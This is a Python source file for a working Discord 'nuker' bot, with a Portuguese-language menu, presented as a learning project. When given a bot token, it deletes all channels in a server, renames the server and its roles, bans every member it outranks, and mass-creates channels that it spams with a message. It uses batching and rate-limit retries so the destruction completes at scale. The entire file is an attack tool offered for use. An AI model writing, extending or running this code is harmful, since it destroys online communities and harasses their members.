import os
import time
import asyncio
import logging
import discord
from discord.ext import commands
from colorama import Fore, Style, init

init(autoreset=True)

logging.getLogger("discord").setLevel(logging.CRITICAL)
logging.getLogger("discord.http").setLevel(logging.CRITICAL)

def clear_cmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def centralizar_texto(texto, largura=80):
    return texto.center(largura)

def mostrar_banner_verde_musgo():
    clear_cmd()
    banner = [
        "• ▌ ▄ ·. ▪   ▐ ▄  ▄▄ •             ",
        "·██ ▐███▪██ •█▌▐█▐█ ▀ ▪▪     ▪     ",
        "▐█ ▌▐▌▐█·▐█·▐█▐▐▌▄█ ▀█▄ ▄█▀▄  ▄█▀▄ ",
        "██ ██▌▐█▌▐█▌██▐█▌▐█▄▪▐█▐█▌.▐▌▐█▌.▐▌",
        "▀▀  █▪▀▀▀ ▀▀▀▀▀ █▪·▀▀▀▀  ▀█▄▀▪ ▀█▄▀▪"
    ]
    largura_terminal = os.get_terminal_size().columns
    cor = Fore.GREEN
    for linha in banner:
        print(cor + centralizar_texto(linha, largura_terminal))
        time.sleep(0.05)
    print(Fore.WHITE + centralizar_texto("Painel Nuker - by @gqai", largura_terminal) + Style.RESET_ALL)

async def digitar_texto_animado(texto, delay=0.002, cor=Fore.LIGHTMAGENTA_EX):
    for linha in texto.splitlines():
        for caractere in linha:
            print(cor + caractere, end='', flush=True)
            await asyncio.sleep(delay)
        print()  # Pula para próxima linha

async def mostrar_creditos():
    clear_cmd()
    mostrar_banner_verde_musgo()

    ascii_art = r"""
                     :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!           
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!                                       
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!   
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:`` 
?MXT@Wx.~    :     ~"##*$$$$M~
    """

    await digitar_texto_animado(ascii_art, delay=0.0008, cor=Fore.LIGHTMAGENTA_EX)

    texto_credito = (
        "\n\nProjeto feito por @gqai (mingoo) com intuito de aprendizado\n"
        "https://instagram.com/mingoocry"
    )

    await digitar_texto_animado(texto_credito, delay=0.01, cor=Fore.WHITE)
    await async_pause()

async def loading_animation(stop_event):
    symbols = ['|', '/', '-', '\\']
    i = 0
    while not stop_event.is_set():
        print(Fore.WHITE + f"Carregando {symbols[i % 4]}", end='\r', flush=True)
        i += 1
        await asyncio.sleep(0.3)
    print(" " * 30, end='\r')

async def ask_question(question):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, lambda: input(Fore.WHITE + question + Style.RESET_ALL).strip().upper())

async def async_pause():
    await ask_question("\nPressione Enter para voltar ao menu...")

async def executar_com_retry(corrotina, max_tentativas=5):
    for tentativa in range(max_tentativas):
        try:
            return await corrotina
        except discord.HTTPException as e:
            if e.status == 429 and hasattr(e, 'retry_after'):
                await asyncio.sleep(e.retry_after)
            else:
                await asyncio.sleep(2)
        except Exception:
            await asyncio.sleep(1)

async def executar_em_lotes(corrotinas, tamanho_lote=50, atraso=1.0):
    for i in range(0, len(corrotinas), tamanho_lote):
        lote = corrotinas[i:i + tamanho_lote]
        await asyncio.gather(*(executar_com_retry(c) for c in lote))
        await asyncio.sleep(atraso)

clear_cmd()
mostrar_banner_verde_musgo()
token = input(Fore.WHITE + "Digite o token do bot: " + Style.RESET_ALL).strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

async def executar_opcao(guild, opcao):
    if opcao == "1":
        confirmacao = await ask_question("\nTem certeza que deseja excluir TODOS os canais? (S/N): ")
        if confirmacao == 'S':
            stop_event = asyncio.Event()
            task_loading = asyncio.create_task(loading_animation(stop_event))
            await executar_em_lotes([channel.delete() for channel in guild.channels])
            stop_event.set()
            await task_loading
        await async_pause()
    elif opcao == "2":
        await nukar(guild)
    elif opcao == "3":
        await mostrar_creditos()
    else:
        await async_pause()

async def nukar(guild):
    clear_cmd()
    mostrar_banner_verde_musgo()
    print(Fore.WHITE + "Você escolheu a opção Nukar.\n" + Style.RESET_ALL)

    apagar_canais = await ask_question("Deseja apagar todos os canais? (S/N): ") == 'S'
    criar_novos_canais = await ask_question("Deseja criar novos canais? (S/N): ") == 'S'

    nome_canal, quantidade_canais = "", 0
    if criar_novos_canais:
        nome_canal = await ask_question("Nome dos novos canais: ")
        quantidade_canais = int(await ask_question("Quantidade de canais: "))

    enviar_msg_canais = criar_novos_canais and await ask_question("Mandar mensagem nos novos canais? (S/N): ") == 'S'
    mensagem = ""
    if enviar_msg_canais:
        mensagem = (await ask_question("Mensagem a ser enviada: ")).lower()

    trocar_nome_servidor = await ask_question("Deseja trocar o nome do servidor? (S/N): ") == 'S'
    novo_nome_servidor = await ask_question("Novo nome do servidor: ") if trocar_nome_servidor else ""

    banir_membros = await ask_question("Deseja banir todos os membros? (S/N): ") == 'S'
    renomear_cargos = await ask_question("Deseja renomear os cargos? (S/N): ") == 'S'
    nome_cargo = await ask_question("Novo nome dos cargos: ") if renomear_cargos else ""

    created_channels = []

    if apagar_canais:
        stop_event = asyncio.Event()
        task_loading = asyncio.create_task(loading_animation(stop_event))
        await executar_em_lotes([channel.delete() for channel in guild.channels])
        stop_event.set()
        await task_loading

    if trocar_nome_servidor:
        stop_event = asyncio.Event()
        task_loading = asyncio.create_task(loading_animation(stop_event))
        await executar_com_retry(guild.edit(name=novo_nome_servidor))
        stop_event.set()
        await task_loading

    if banir_membros:
        stop_event = asyncio.Event()
        task_loading = asyncio.create_task(loading_animation(stop_event))
        membros_a_banir = [m for m in guild.members if m.id not in (guild.owner_id, bot.user.id) and m.top_role < guild.me.top_role]
        await executar_em_lotes([m.ban(reason="Nukado") for m in membros_a_banir])
        stop_event.set()
        await task_loading

    if renomear_cargos:
        stop_event = asyncio.Event()
        task_loading = asyncio.create_task(loading_animation(stop_event))
        await executar_em_lotes([r.edit(name=nome_cargo) for r in guild.roles if r.name != "@everyone"])
        stop_event.set()
        await task_loading

    if criar_novos_canais:
        stop_event = asyncio.Event()
        task_loading = asyncio.create_task(loading_animation(stop_event))
        created_channels = await asyncio.gather(*[executar_com_retry(guild.create_text_channel(nome_canal)) for _ in range(quantidade_canais)])
        stop_event.set()
        await task_loading

        if enviar_msg_canais:
            stop_event = asyncio.Event()
            task_loading = asyncio.create_task(loading_animation(stop_event))
            await executar_em_lotes([channel.send(mensagem) for channel in created_channels])
            stop_event.set()
            await task_loading

    await async_pause()

@bot.event
async def on_ready():
    while True:
        clear_cmd()
        mostrar_banner_verde_musgo()
        print(Fore.WHITE + f"\nNuker conectado como: {bot.user}" + Style.RESET_ALL)

        if not bot.guilds:
            await bot.close()
            break

        guild = bot.guilds[0]
        print(Fore.WHITE + "\n1 - Apagar todos os canais")
        print("2 - Nukar servidor")
        print("3 - Créditos")
        print("0 - Sair" + Style.RESET_ALL)

        opcao = await ask_question("\nEscolha uma opção: ")

        if opcao == "0":
            await bot.close()
            break

        await executar_opcao(guild, opcao)

@bot.event
async def on_command_error(ctx, error):
    pass

if __name__ == "__main__":
    bot.run(token)
